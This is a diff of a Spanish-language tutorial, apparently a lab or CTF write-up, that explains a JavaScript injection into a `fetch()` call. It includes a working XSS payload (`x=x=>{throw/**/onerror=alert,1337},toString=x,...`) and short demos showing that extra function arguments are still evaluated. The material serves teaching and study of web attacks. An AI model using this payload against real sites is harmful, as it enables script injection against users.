@@ -72,13 +72,15 @@ Son formas de manejar el resultado de `fetch()`:
 
 La lógica detrás de esta inyección consiste en cerrar el parámetro actual e insertar nuevos parámetros dentro de la función `fetch` para ejecutar código, aquí es donde entra la cadena `&'}`.
 
-Luego ingresamos nuevos parámetros separados por `,`:
+Luego ingresamos nuevos parámetros separados por `,`, `x=x=>{throw/**/onerror=alert,1337}`. `toString=x`, `window+''` y `{x:`:
 ```html
 x=x=>{throw/**/onerror=alert,1337},toString=x,window+'' ,{x:'
 ```
 
-La pregunta es, si la función fecth tiene sólo 2 argumentos, ¿es posible realmente agregarle nuevos?
-Probemos creando una función:
+### ¿Pero la función fetch no tiene solo 2 argumentos?
+Correcto: `fetch(input, init)` solo acepta dos argumentos. Entonces, ¿cómo puede funcionar esta inyección si agregamos más?
+
+Probemos con una función simple para entenderlo:
 ```javascript
 <script>
   function myFunc(a, b){
@@ -90,7 +92,7 @@ Resultado:
 ```javascript
 3
 ```
-Ahora intentamos imprimir más parámetros de los que tiene la función
+Ahora intentamos pasarle más parámetros de los que espera:
 ```javascript
 <script>
   function myFunc(a, b){
@@ -103,8 +105,9 @@ Resultado:
 ```javascript
 3
 ```
-Esto quiere decir que no se está lanzando ningún tipo de error, por maś que solicite parámetros que no existen.
-Ahora veamos que pasa si teniendo una variable predefinida, intentamos cambiar su valor dentro de los parámetros agregados a la función:
+No se lanza ningún error, incluso si agregamos argumentos adicionales. Simplemente son ignorados por la función.
+
+Ahora veamos qué pasa si aprovechamos esos argumentos adicionales para ejecutar código:
 ```javascript
 <script>
   let myVar = 1;
@@ -120,7 +123,10 @@ Resultado:
 3
 10
 ```
-En conclusión, podemos agregar parámetros dentro de una inyección, para poder ejecutar código y eso es lo que haremos.
+✅ Aunque myFunc no usa esos parámetros extra, su simple evaluación modifica el valor de una variable global.
+✅ Conclusión:
+Sí, podemos agregar parámetros dentro de una inyección aunque la función fetch no los use. JavaScript los evalúa igualmente, y podemos aprovechar esto para ejecutar código malicioso.
+
 
 ---
 
